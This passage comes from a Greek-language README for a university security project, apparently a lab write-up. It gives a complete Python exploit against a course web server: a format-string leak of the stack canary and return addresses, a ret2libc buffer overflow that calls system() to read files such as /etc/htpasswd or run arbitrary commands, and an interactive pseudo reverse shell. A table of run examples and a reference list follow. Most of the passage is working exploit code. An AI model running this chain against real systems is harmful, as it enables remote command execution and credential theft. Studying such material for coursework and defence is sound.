   binary_payload.write(("p" * 4).encode("utf-8"))
   binary_payload.write(svd_rt_ebx)
   binary_payload.write(svd_rt_ebp)
   binary_payload.write(sndf_ret)
   binary_payload.write(fin_ret)
   binary_payload.write(argument)

   url = 'http://localhost:' + argv[1] + '/ultimate.html'
   header_data_b64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
   headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}
   response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

   print(response.text)

   # ------------------------------------------------------
   # Run: python3 bof.py <port> <file_to_retrieve>
   # eg.: python3 bof.py 8000 /etc/htpasswd
   ```

   </p>
</details><br/>

---

### Multiple Command Execution - Reverse Shell Simulation

Τέλος, αυτό που τελικά κρατήσαμε και αναπτύξαμε ήταν να εκτελέσουμε πολλαπλές εντολές μέσω της `system()`, ξεκινώντας με ένα απλό **`echo 'HTTP/1.1 200 OK\n'`**.
Ετσι, πετυχαίναμε να στείλουμε πρώτα τα headers με έναν εξαιρετικά απλό τρόπο και στη συνέχεια να εκτελούμε οποιαδήποτε εντολή θέλαμε μέσω αυτής. [<sup>\[19\]</sup>](#19--httpsbloglamarranetcomindexphpexploit-education-phoenix-heap-two-solution)[<sup>\[20\]</sup>](#20--httpsqiitacomv_avengeritems8afcf758990c9ab03ad7)

Πραγματοποιήσαμε και μια σειρά από βελτιστοποιήσεις, έτσι ώστε να ελαχιστοποιήσουμε τον χώρο που καταλαμβάνεται από το payload και να μεγιστοποιήσουμε το
ανώτατο δυνατό μέγεθος για κάποιο command που θα θέλαμε να εκτελέσουμε. Έτσι, καταφέραμε να φτάσουμε το ανώτατο μέγεθος ενός request στα **460 bytes**.
Μπορούν δηλαδή να ζητηθούν requests μέχρι και **460** χαρακτήρων και να εκτελεστούν κανονικά. 

Επίσης, έχουμε αυτοματοποιήσει πλήρως όλες τις διαδικασίες και έχουμε φτιάξει μια προσομοίωση ενός **Reverse Shell**, ώστε να είναι ακόμα πιο εύκολος ο χειρισμός
του script και του attack γενικότερα.

Έχουμε φτιάξει ένα εικονικό περιβάλλον σαν terminal στο οποίο μπορεί ο χρήστης να εισάγει κάποια εντολή η οποία θα επιστρέψει το αποτέλεσμα άμεσα, πραγματοποιώντας 
στο background όλες τις διαδικασίες του attack.

Το script παρέχει και πολλές παραμέτρους τροποποίησης ακόμα. Παρακάτω παρατίθεται ένας πίνακας με τα flags και τις περιγραφές τους.

|Flags|Description|Values|Default Value|
|-|-|-|-|
|-p|Change authentication **password**|_User\_defined_|you shall not pass|
|-t|Change **timeout** limit of the request|None, integer|5|
|-d|Disables **information messages**|N/A|Enabled|
|-s|Enables **ret2libc** attack|N/A|Disabled|
|-xd|Exports **results** into specified file|string|N/A|
|-xp|Exports **payload** into specified file|string|N/A|
|-rs|Enables **Reverse Shell Simulation**|N/A|Disabled|

<details>
<summary><b>Click here to see the full script</b></summary>
   <p>

   ```python
   import sys
   import pycurl
   import struct
   import base64
   import requests

   from sys import argv
   from io  import BytesIO

   colors = {'Red'          : '\033[31m'      ,
             'Green'        : '\033[32m'      ,
             'Yellow'       : '\033[33m'      ,
             'Blue'         : '\033[34m'      ,
             'Purple'       : '\033[35m'      ,

             'Light_Red'    : '\033[91m'      ,
             'Light_Green'  : '\033[92m'      ,
             'Light_Yellow' : '\033[93m'      ,
             'Light_Blue'   : '\033[94m'      ,
             'Light_Purple' : '\033[95m'      ,

             'Bright_Red'   : '\033[1;31m'    ,
             'Bright_Green' : '\033[1;32m'    ,
             'Bright_Yellow': '\033[1;33m'    ,
             'Bright_Blue'  : '\033[1;34m'    ,
             'Bright_Purple': '\033[1;35m'    ,

             'BLight_Red'   : '\033[1;91m'    ,
             'BLight_Green' : '\033[1;92m'    ,
             'BLight_Yellow': '\033[1;93m'    ,
             'BLight_Blue'  : '\033[1;94m'    ,
             'BLight_Purple': '\033[1;95m'    ,

             'White'        : '\033[1;37m'    ,
             'Orange'       : '\033[38;5;214m',
             'Reset'        : '\033[0m'}

   # ---------------------------------------------------------------------------------------------------- #

   def send_headers_request(port, path, header_data, messages=1):

       url = 'http://localhost:' + port + path

       if messages:
           print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))

       header_data_b64 = base64.b64encode(bytes(header_data, 'utf-8'))
       headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}

       if messages:
           print("\nSending request with payload: {}{}{}".format(colors["Bright_Blue"], header_data, colors["Reset"]))

       response = requests.request("GET", url, headers=headers)

       return response

   # ---------------------------------------------------------------------------------------------------- #

   def send_http_request(port, path, header_data, payload, ret2libc=0, timeout=7, messages=1):

       url = 'http://localhost:' + port + path

       if messages:
           print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))

       header_data_b64 = base64.b64encode(bytes('admin:' + header_data, 'utf-8'))
       headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}

       try:
           if messages:
               print("\nSending request...")

           response = requests.request("POST", url, headers=headers, data=payload.getvalue(), timeout=timeout)

           if messages:
               if ret2libc:
                   print("Executing command... ")
               else:
                   print("Retrieving Data... ")
       except: 
           if ret2libc:
               print("Command execution failed")
           else:
               print("File not found")
           return None

       return response

   # ---------------------------------------------------------------------------------------------------- #

   def build_payload(resp_data, path, ret2libc=0, export_path=None, messages=1):

       # Building the payload
       canary   = resp_data[-5]
       ebx      = resp_data[-4]
       ebp      = resp_data[-3]
       auth_ret = resp_data[-2]
       main_ret = resp_data[-1]

       if messages:
           print("\nResponse: ")
           print("  -> Canary                = {}{}{}    ".format(colors["Bright_Yellow"]                   , canary   , colors["Reset"]), sep='')
           print("  -> EBX      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Orange"]    , ebx      , colors["Reset"]), sep='')
           print("  -> EBP      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], ebp      , colors["Reset"]), sep='')
           print("  -> Ret_Addr (check_auth) = {0}0x{1}{2}{3}  <{4}route{3}+{5}114{3}>".format(colors["Light_Blue"] , colors["Orange"], auth_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')
           print("  -> Ret_Addr (main)       = {0}0x{1}{2}{3}  <{4}__libc_start_main{3}+{5}247{3}>".format(colors["Light_Blue"], colors["Bright_Purple"], main_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')

           print("\nCalculating new attack addresses... ", end='')

       offset_to_fin_ret = 0xF4E
       offset_to_system  = 0x22769
       offset_to_path    = 0x90

       canary   = struct.pack('<L', int(canary  , base=16))

       svd_ebx  = struct.pack('<L', int(ebx     , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
       argument = struct.pack('<L', int(ebp     , base=16) - offset_to_path)

       sys_ret  = struct.pack('<L', int(main_ret, base=16) + offset_to_system)
       fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)

       if messages:
           print("Done\n")
           print("Ret to {0}system{1}    = {2}0x{4}{3}{1}  <{5}system{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(main_ret, base=16) + offset_to_system)[2:] , colors["Bright_Purple"], colors["Bright_Yellow"]), sep='')
           print("Ret to {0}route{1}     = {2}0x{4}{3}{1}  <{5}respond{1}+{6}793{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(auth_ret, base=16) + offset_to_fin_ret)[2:] , colors["Orange"], colors["Bright_Yellow"], colors["White"]), sep='')
           print("Argument address = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], hex(int(ebp, base=16) - offset_to_path)[2:], colors["Reset"]) , sep='')
           print("Given argument   = {}{}{}".format(colors["Orange"], path, colors["Reset"]), sep='')

       if messages:
           print("\nGenerating payload... ", end='')

       binary_payload = BytesIO()

       binary_payload.write(("p" * 100).encode("utf-8"))
       binary_payload.write(canary)
       binary_payload.write(("p" * 4).encode("utf-8"))
       binary_payload.write(svd_ebx)
       binary_payload.write(svd_ebp)
       binary_payload.write(sys_ret)
       binary_payload.write(fin_ret)
       binary_payload.write(argument)
       binary_payload.write(("echo 'HTTP/1.1 200 OK\n';").encode("utf-8"))
       if ret2libc:
           binary_payload.write(("{}&".format(path)).encode("utf-8"))
       else:
           binary_payload.write(("cat {}&".format(path)).encode("utf-8"))

       if messages:
           print("Done")

       if export_path != None:
           if messages:
               print("Exporting payload in {}{}{}...".format(colors["Light_Green"], export_path, colors["Reset"]), end='', sep='')

           try:
               xp = open(export_path, 'wb')
           except:
               print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
               exit()

           xp.write(binary_payload.getvalue())
           xp.close()

           if messages:
               print("Done")

       null_free_payload = BytesIO()
       bp_val = binary_payload.getvalue()
       anchor = 0
       for i, byte in enumerate(binary_payload.getvalue()):
           if not byte:
               null_free_payload.write(bp_val[anchor:i])
               null_free_payload.write(("=").encode("utf-8"))
               anchor = i + 1

       null_free_payload.write(bp_val[anchor:])
       return null_free_payload

   # ---------------------------------------------------------------------------------------------------- #

   def perform_attack(port, password, path, ret2libc=0, export_results=None, export_payload=None, timeout=7, messages=1):

       header_payload = '%27$x %29$x %30$x %31$x %111$x'

       response  = send_headers_request(port, '/', header_payload, messages=messages)
       resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

       binary_payload = build_payload(resp_data, path, ret2libc, export_payload, messages)

       response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc, timeout, messages)

       if response is None:
           exit()

       if response.status_code != 200:
           print("\n{}Error:{} Status {}{}{}\n".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], response.status_code, colors["Reset"]), sep='')
           exit()

       if messages:
           print("\nCompleted {}Successfully{}".format(colors["Light_Green"], colors["Reset"]))

       if export_results != None:
           try:
               fp = open(export_results, 'wb')
           except:
               print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_results, colors["Reset"]))
               exit()

           if messages:
               print("\nExporting received data in {}{}{}...".format(colors["Orange"], export_results, colors["Reset"]), end='', sep='')

           fp.write(response.content)
           fp.close()

           print("Done\n")
       else:
           if messages:
               print("--------------------------------------------------\n")

           print(response.text)

   # ---------------------------------------------------------------------------------------------------- #

   def rev_shell(port, password, timeout=7):

       while True:

           try:
               command = input(">> ")
           except:
               print()
               exit()

           export_path = None

           if ">" in command:
               parse_cmd   = command.replace(' ' , '').split('>')
               command     = parse_cmd[0]
               export_path = parse_cmd[1]

           elif command == "exit":
               return

           elif command in ["clear", "cl"]:
               print("\033[2J\033[1;1H")
               continue

           elif not command:
               continue

           elif "t=" in command.replace(' ', ''):
               tval = command.replace(' ', '').split('t=')[1]

               if tval.lower() != 'none':
                   timeout = float(tval)
                   print("Timeout set to: ", timeout)

                   if timeout < 0:
                       timeout = 5
               else:
                   print("Timeout set to: None")
                   tval = None

               continue

           header_payload = '%27$x %29$x %30$x %31$x %111$x'

           response  = send_headers_request(port, '/', header_payload, messages=0)
           resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

           binary_payload = build_payload(resp_data, command, ret2libc=1, messages=0)

           response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc=1, timeout=timeout, messages=0)

           if response is None:
               continue

           if export_path != None:

               try:
                   fp = open(export_path, 'wb')
               except:
                   print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
                   exit()

               fp.write(response.content)
               fp.close()

           else:
               print(response.text)

   # ---------------------------------------------------------------------------------------------------- #
   # ---------------------------------------------------------------------------------------------------- #

   if __name__ == "__main__":

       # Change default password
       if '-p' in argv:
           password = argv[argv.index('-p') + 1]
       else:
           password = 'you shall not pass'


       # Change timeout parameter for POST request
       if '-t' in argv:
           if argv[argv.index('-t') + 1] == 'None':
               timeout = None
           else:
               timeout = float(argv[argv.index('-t') + 1])
       else:
           timeout = 5


       # Disable messages
       if '-d' in argv:
           messages = 0
       else:
           messages = 1


       # Enable ret2libc attack
       if '-s' in argv:
           ret2libc = 1
       else:
           ret2libc = 0


       # Export results into file
       if '-xd' in argv:
           export_results = argv[argv.index('-xd') + 1]
       else:
           export_results = None


       # Export binary payload into file
       if '-xp' in argv:
           export_payload = argv[argv.index('-xp') + 1]
       else:
           export_payload = None


       # Enable reverse shell
       if '-rs' in argv:
           rev_shell(argv[1], password, timeout)
       else:
           perform_attack(argv[1], password, argv[2], ret2libc, export_results, export_payload, timeout, messages)
   ```

   </p>
</details><br/>

<details>
<summary><b>Click here to see how to run examples</b></summary>
   <p>

   |Run Examples|Description|Output|
   |-|-|-|
   |python3 rev_shell.py 8000 /etc/htpasswd|Επιστρέφει τα περιεχόμενα του αρχείου που δόθηκε σαν όρισμα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/34-Rev_Shell_Example1.png)|
   |python3 rev_shell.py 8000 "ls -la" -s|Εκτελεί τη δοσμένη εντολή μέσω της `system()`|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/35-Rev_Shell_Example2.png)|
   |python3 rev_shell.py 9000 www/htpasswd -p my_pass|Αλλάζει τον κωδικό που θα χρησιμοποιηθεί για το authentication (κυρίως για χρήση σε τοπικούς servers)|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/36-Rev_Shell_Example3.png)|
   |python3 rev_shell.py 8000 /proc/self/maps -t None|Αλλάζει το timeout του request (χρησιμεύει κυρίως για πειραματισμούς)|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/37-Rev_Shell_Example4.png)|
   |python3 rev_shell.py 8000 /proc/net/tcp -xd respond.txt -xp payload.txt|Κάνει εξαγωγή του respond και του payload αντιστοίχως, στα αρχεία που δόθηκαν ως ορίσματα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/38-Rev_Shell_Example5.png)|
   |python3 rev_shell.py 8000 /etc/admin_pwd -d|Απενεργοποιεί τα μηνύματα προόδου του request|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/39-Rev_Shell_Example6.png)|
   |python3 rev_shell.py 8000 -rs|Ενεργοποιεί την προσομοίωση του **Reverse Shell**|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/40-Rev_Shell_Example7.png)|
   
   </p>
</details><br/>

## References

<h5><sup>[1]</sup>  https://www.robotstxt.org/robotstxt.html</h5>
<h5><sup>[2]</sup>  https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf#page=33</h5>
<h5><sup>[3]</sup>  https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</h5>
<h5><sup>[4]</sup>  https://stackoverflow.com/questions/6916805/why-does-a-base64-encoded-string-have-an-sign-at-the-end</h5>
<h5><sup>[5]</sup>  https://owasp.org/www-community/attacks/Format_string_attack</h5>
<h5><sup>[6]</sup>  https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11</h5>
<h5><sup>[7]</sup>  https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes</h5>
<h5><sup>[8]</sup>  https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-960/version_id-219995/GNU-GCC-5.4.html</h5>
<h5><sup>[9]</sup>  https://ctf101.org/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary</h5>
<h5><sup>[10]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
<h5><sup>[11]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
<h5><sup>[12]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
<h5><sup>[13]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
<h5><sup>[14]</sup>  https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf#page=6</h5>
<h5><sup>[15]</sup>  https://en.wikipedia.org/wiki/Deep_Blue_versus_Garry_Kasparov#Game_6_2</h5>
<h5><sup>[16]</sup>  http://www.kasparov.com/timeline-event/deep-blue/</h5>
<h5><sup>[17]</sup>  https://www.netsparker.com/blog/web-security/exposing-public-ips-tor-services-through-ssl-certificates/</h5>
<h5><sup>[18]</sup>  https://www.bleepingcomputer.com/news/security/public-ip-addresses-of-tor-sites-exposed-via-ssl-certificates/</h5>
<h5><sup>[19]</sup>  https://blog.lamarranet.com/index.php/exploit-education-phoenix-heap-two-solution/</h5>
<h5><sup>[20]</sup>  https://qiita.com/v_avenger/items/8afcf758990c9ab03ad7</h5>
